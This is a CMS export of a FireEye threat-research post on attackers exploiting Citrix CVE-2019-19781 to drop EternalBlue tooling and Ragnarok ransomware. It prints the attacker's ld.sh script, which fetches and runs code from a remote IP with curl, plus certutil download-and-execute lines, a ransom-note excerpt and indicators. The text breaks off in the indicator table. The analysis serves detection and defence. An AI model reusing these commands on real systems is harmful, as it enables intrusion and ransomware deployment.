{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Fri Jan 24 2020 17:05:40 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "Nice Try: 501 (Ransomware) Not Implemented",
    "jcr:versionHistory": "c787d7ac-21bf-4311-8bdb-b29c1d9f63f6",
    "author": "Matt Bromiley",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "6736d9fb-2dd7-491f-9544-e5395cb46477"
    ],
    "jcr:created": "Fri Jan 24 2020 18:59:11 GMT+0000",
    "cq:lastModified": "Fri Jan 24 2020 18:58:49 GMT+0000",
    "jcr:baseVersion": "6736d9fb-2dd7-491f-9544-e5395cb46477",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:matt-bromiley",
      "fireeye-blog-authors:cap-christopher-glyer",
      "fireeye-blog-authors:andrew-thompson",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:vulnerability",
      "fireeye-blog-tags:ransomware",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:exploit"
    ],
    "jcr:uuid": "f65f4278-861b-47eb-ae23-1aff4ff33968",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Fri Jan 24 2020 12:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ch4\u003EAn Ever-Evolving Threat\u003C\/h4\u003E\n\u003Cp\u003ESince January 10, 2020, FireEye has tracked extensive global exploitation of CVE-2019-19781, which continues to impact Citrix ADC and Gateway \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.citrix.com\/blogs\/2020\/01\/19\/vulnerability-update-first-permanent-fixes-available-timeline-accelerated\/\u0022\u003Einstances that are unpatched\u003C\/a\u003E or do not have \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/support.citrix.com\/article\/CTX267679\u0022\u003Emitigations applied\u003C\/a\u003E. We previously reported on \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/01\/rough-patch-promise-it-will-be-200-ok.html\u0022\u003Eattackers\u2019 swift attempts to exploit this vulnerability\u003C\/a\u003E and the post-compromise deployment of the previously unseen \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2020\/01\/vigilante-deploying-mitigation-for-citrix-netscaler-vulnerability-while-maintaining-backdoor.html\u0022\u003ENOTROBIN malware family\u003C\/a\u003E by one threat actor. FireEye continues to actively track multiple clusters of activity associated with exploitation of this vulnerability, primarily based on how attackers interact with vulnerable Citrix ADC and Gateway instances after identification.\u003C\/p\u003E\n\u003Cp\u003EWhile most of the CVE-2019-19781 exploitation activity we\u2019ve observed to this point has led to the deployment of coin miners or most commonly NOTROBIN, recent compromises suggest that this vulnerability is also being exploited to deploy ransomware. If your organization is attempting to assess whether there is evidence of compromise related to exploitation of CVE-2019-19781, we highly encourage you to use the \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/products-and-services\/2020\/01\/fireeye-and-citrix-tool-scans-for-iocs-related-to-vulnerability.html\u0022\u003EIOC Scanner co-published by FireEye and Citrix\u003C\/a\u003E, which detects the activity described in this post.\u003C\/p\u003E\n\u003Cp\u003EBetween January 16 and 17, 2020, FireEye \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.fireeye.com\/solutions\/managed-defense.html\u0022\u003EManaged Defense\u003C\/a\u003E detected the IP address \u003Cspan class=\u0022code\u0022\u003E45[.]120[.]53[.]214\u003C\/span\u003E attempting to exploit CVE-2019-19781 at dozens of FireEye clients. When successfully exploited, we observed impacted systems executing the cURL command to download a shell script with the file name \u003Cspan class=\u0022code\u0022\u003Eld.sh\u003C\/span\u003E from \u003Cspan class=\u0022code\u0022\u003E45[.]120[.]53[.]214\u003C\/span\u003E (Figure 1). In some cases this same shell script was instead downloaded from \u003Cspan class=\u0022code\u0022\u003Ehxxp:\/\/198.44.227[.]126:81\/citrix\/ld.sh\u003C\/span\u003E.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix3\/picture1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Snippet of ld.sh, downloaded from 45.120.53.214\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe shell script, provided in Figure 2, searches for the \u003Cspan class=\u0022code\u0022\u003Epython2\u003C\/span\u003E binary (Note: Python is only pre-installed on Citrix Gateway 12.x and 13.x systems) and downloads two additional files to the system: \u003Cspan class=\u0022code\u0022\u003Epiz.Lan\u003C\/span\u003E, a XOR-encoded data blob, and \u003Cspan class=\u0022code\u0022\u003Ede.py\u003C\/span\u003E, a Python script, to a temporary directory. This script then changes permissions and executes \u003Cspan class=\u0022code\u0022\u003Ede.py\u003C\/span\u003E, which subsequently decodes and decompresses \u003Cspan class=\u0022code\u0022\u003Epiz.Lan\u003C\/span\u003E. Finally, the script cleans up the initial staging files and executes \u003Cspan class=\u0022code\u0022\u003Escan.py\u003C\/span\u003E, an additional script we will cover in more detail later in the post.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E#!\/bin\/sh\u003Cbr\u003E\n rm $0\u003Cbr\u003E\n if [ ! -f \u0026quot;\/var\/python\/bin\/python2\u0026quot; ]; then\u003Cbr\u003E\n echo \u0027Exit\u0027\u003Cbr\u003E\n exit\u003Cbr\u003E\n fi\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Emkdir \/tmp\/rAgn\u003Cbr\u003E\n cd \/tmp\/rAgn\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecurl hxxp:\/\/45[.]120[.]53[.]214\/piz.Lan -o piz.Lan\u003Cbr\u003E\n sleep 1\u003Cbr\u003E\n curl hxxp:\/\/45[.]120[.]53[.]214\/de -o de.py\u003Cbr\u003E\n chmod 777 de.py\u003Cbr\u003E\n \/var\/python\/bin\/python2 de.py\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Erm de.py\u003Cbr\u003E\n rm piz.Lan\u003Cbr\u003E\n rm .new.zip\u003Cbr\u003E\n cd httpd\u003Cbr\u003E\n \/var\/python\/bin\/python2 scan.py -n 50 -N 40 \u0026amp;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Contents of ld.sh, a shell-script to download additional tools to the compromised system\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003Epiz.Lan -\u0026gt; .net.zip\u003C\/h4\u003E\n\u003Cp\u003EArmed with the information gathered from \u003Cspan class=\u0022code\u0022\u003Ede.py\u003C\/span\u003E, we turned our attention to decoding and decompressing \u201c\u003Cspan class=\u0022code\u0022\u003E.net.zip\u003C\/span\u003E\u201d (MD5: 0caf9be8fd7ba5b605b7a7b315ef17a0). Inside, we recovered five files, represented in Table 1:\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EFilename\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EFunctionality\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMD5\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ex86.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E32-bit Downloader\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E9aa67d856e584b4eefc4791d2634476a\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ex64.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E64-bit Downloader\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E55b40e0068429fbbb16f2113d6842ed2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Escan.py\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPython socket scanner\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eb0acb27273563a5a2a5f71165606808c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Exp_eternalblue.replay\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExploit replay file\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E6cf1857e569432fcfc8e506c8b0db635\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eeternalblue.replay\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExploit replay file\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002233%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E9e408d947ceba27259e2a9a5c71a75a8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Contents of the ZIP file \u0026quot;.new.zip\u0026quot;, created by the script de.py\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe contents of the ZIP were explained via analysis of the file \u003Cspan class=\u0022code\u0022\u003Escan.py\u003C\/span\u003E, a Python scanning script that would also automate exploitation of identified vulnerable system(s). Our initial analysis showed that this script was a combination of functions from multiple open source projects or scripts. As one example, the replay files, which were either adapted or copied directly from this \u003Ca href=\u0022https:\/\/github.com\/pythonone\/MS17-010\/tree\/master\/exploits\/eternalblue\u0022\u003Epublic\u003C\/a\u003E GitHub repository, were present in the \u003Cspan class=\u0022code\u0022\u003EInstall_Backdoor\u003C\/span\u003E function, as shown in Figure 3:\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix3\/picture3.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Snippet of scan.py showing usage of EternalBlue replay files\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThis script also had multiple functions checking whether an identified system is 32- vs. 64-bit, as well as raw shell code to step through an exploit. The \u003Cspan class=\u0022code\u0022\u003Eexploit_main\u003C\/span\u003E function, when called, would appropriately choose between 32- or 64-bit and select the right DLL for injection, as shown in Figure 4.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix3\/picture4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Snippet of scan.py showing instructions to deploy 32- or 64-bit downloaders\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EI Call Myself Ragnarok\u003C\/h4\u003E\n\u003Cp\u003EOur analysis continued by examining the capabilities of the 32- and 64-bit DLLs, aptly named \u003Cspan class=\u0022code\u0022\u003Ex86.dll\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003Ex64.dll\u003C\/span\u003E. At only 5,120 bytes each, these binaries performed the following tasks (Figure 5 and Figure 6):\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003EDownload a file named \u003Cspan class=\u0022code\u0022\u003Epatch32\u003C\/span\u003E or \u003Cspan class=\u0022code\u0022\u003Epatch64\u003C\/span\u003E (respective to operating system bit-ness) from a hard-coded URL using \u003Cspan class=\u0022code\u0022\u003Ecertutil\u003C\/span\u003E, a native tool used as part of Windows Certificate Services (categorized as Technique 11005 within \u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1105\/\u0022\u003EMITRE\u2019s ATT\u0026amp;CK framework\u003C\/a\u003E).\u003C\/li\u003E\n\u003Cli\u003EExecute the downloaded binary \u003Cspan class=\u0022code\u0022\u003Esince1969.exe\u003C\/span\u003E, located in \u003Cspan class=\u0022code\u0022\u003EC:\\Users\\Public\u003C\/span\u003E.\u003C\/li\u003E\n\u003Cli\u003EDelete the URL from the current user\u2019s certificate cache.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Ecertutil.exe -urlcache -split -f hxxp:\/\/45.120.53[.]214\/patch32 C:\/Users\/Public\/since1969.exe\u003Cbr\u003E\n cmd.exe \/c C:\/Users\/Public\/since1969.exe\u003Cbr\u003E\n certutil -urlcache -f hxxp:\/\/45.120.53[.]214\/patch32 delete\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Snippet of strings from x86.dll\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Ecertutil.exe -urlcache -split -f hxxp:\/\/45.120.53[.]214\/patch64 C:\/Users\/Public\/since1969.exe\u003Cbr\u003E\n cmd.exe \/c C:\/Users\/Public\/since1969.exe\u003Cbr\u003E\n certutil -urlcache -f hxxp:\/\/45.120.53[.]214\/patch64 delete\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Snippet of strings from x64.dll\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAlthough neither \u003Cspan class=\u0022code\u0022\u003Epatch32\u003C\/span\u003E nor \u003Cspan class=\u0022code\u0022\u003Epatch64\u003C\/span\u003E were available at the time of analysis, FireEye identified a file on VirusTotal with the name \u003Cspan class=\u0022code\u0022\u003Eavpass.exe\u003C\/span\u003E (MD5: e345c861058a18510e7c4bb616e3fd9f) linked to the IP address 45[.]120[.]53[.]214 (Figure 8). This file is an instance of the \u003Ca href=\u0022https:\/\/www.virustotal.com\/gui\/file\/813414cbdaa738393561ebae0778f17e2810ff39592a0e731b654f33805fd644\/detection\u0022\u003Epublicly available Meterpreter backdoor\u003C\/a\u003E that was uploaded on November 12, 2019. Additional analysis confirmed that this binary communicated to 45[.]120[.]53[.]214 over TCP port 1234.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix3\/picture7.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: VirusTotal graph showing links between resources hosted on or communicating with 45.120.53.214\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWithin the \u003Cspan class=\u0022code\u0022\u003Eavpass.exe\u003C\/span\u003E binary, we found an interesting PDB string that provided more context about the tool\u2019s author: \u201c\u003Cspan class=\u0022code\u0022\u003EC:\\Users\\ragnarok\\source\\repos\\avpass\\Debug\\avpass.pdb\u003C\/span\u003E\u201d. Utilizing \u003Cspan class=\u0022code\u0022\u003Eragnarok\u003C\/span\u003E as a keyword, we pivoted and were able to identify a separate copy of \u003Cspan class=\u0022code\u0022\u003Esince1969.exe\u003C\/span\u003E (MD5: 48452dd2506831d0b340e45b08799623) uploaded to VirusTotal on January 23, 2020. The binary\u2019s compilation timestamp of January 16, 2020, aligns with our earliest detections associated with this threat actor.\u003C\/p\u003E\n\u003Cp\u003EFurther analysis and sandboxing of this binary brought all the pieces together\u2014this threat actor may have been attempting to deploy ransomware aptly named \u2018Ragnarok\u2019. We\u2019d like to give credit to \u003Ca href=\u0022https:\/\/twitter.com\/struppigel\/status\/1218188275657166849\u0022\u003Ethis Tweet\u003C\/a\u003E from Karsten Hahn, who identified ragnarok-related about artifacts on January 17, 2020, again aligning with the timeframe of our initial detection. Figure 8 provides a snippet of files created by the binary upon execution.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/citrix3\/picture8.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Ragnarok-related ransomware files\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EThe ransom note dropped by this ransomware, shown in Figure 11, points to three email addresses.\u003C\/p\u003E\n\u003Cp\u003E6.it\u0027s wise to pay as soon as possible it wont make you more losses\u003C\/p\u003E\n\u003Cp\u003Ethe ransome: 1 btcoin for per machine,5 bitcoins for all machines\u003C\/p\u003E\n\u003Cp\u003Ehow to buy bitcoin and transfer? i think you are very good at googlesearch\u003C\/p\u003E\n\u003Cp\u003Easgardmaster5@protonmail[.]com\u003Cbr\u003E\nragnar0k@ctemplar[.]com\u003Cbr\u003E\nj.jasonm@yandex[.]com\u003C\/p\u003E\n\u003Cp\u003EAttention:if you wont pay the ransom in five days, all of your files will be made public on internet and will be deleted\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Snippet of ransom note dropped by \u201csince1969.exe\u201d\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EImplications\u003C\/h4\u003E\n\u003Cp\u003EFireEye continues to observe multiple actors who are currently seeking to take advantage of CVE-2019-19781. This post outlines one threat actor who is using multiple exploits to take advantage of vulnerable internal systems and move laterally inside the organization. Based on our initial observations, the ultimate intent may have been the deployment of ransomware, using the Gateway as a central pivot point.\u003C\/p\u003E\n\u003Cp\u003EAs previously mentioned, if suspect your Citrix appliances may have been compromised, we recommend utilizing the \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/ioc-scanner-CVE-2019-19781\/releases\/tag\/v1.0\u0022\u003Etool FireEye released in partnership with Citrix\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ch4\u003EDetect the Technique\u003C\/h4\u003E\n\u003Cp\u003EAside from CVE-2019-19781, FireEye detects the activity described in this post across our platforms, including named detections for Meterpreter, and EternalBlue. Table 2 contains several specific detection names to assist in detection of this activity.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESignature Name\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECERTUTIL.EXE DOWNLOADER (UTILITY)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECURL Downloading Shell Script\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EETERNALBLUE EXPLOIT\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EMETERPRETER (Backdoor)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EMETERPRETER URI (STAGER)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESMB - ETERNALBLUE\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: FireEye Detections for activity described in this post\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EIndicators\u003C\/h4\u003E\n\u003Cp\u003ETable 3 provides the unique indicators discussed in this post.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EIndicator Type\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EIndicator\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ENotes\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E45[.]120[.]53[.]214\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E198[.]44[.]227[.]126\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E91dd06f49b09a2242d4085703599b7a7\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Epiz.Lan\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E01af5ad23a282d0fd40597c1024307ca\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ede.py\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ebd977d9d2b68dd9b12a3878edd192319\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eld.sh\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E0caf9be8fd7ba5b605b7a7b315ef17a0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E.new.zip\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E9aa67d856e584b4eefc4791d2634476a\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ex86.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E55b40e0068429fbbb16f2113d6842ed2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ex64.dll\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eb0acb27273563a5a2a5f71165606808c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Escan.py\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E6cf1857e569432fcfc8e506c8b0db635\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Exp_eternalblue.replay\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E9e408d947ceba27259e2a9a5c71a75a8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eeternalblue.replay\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd 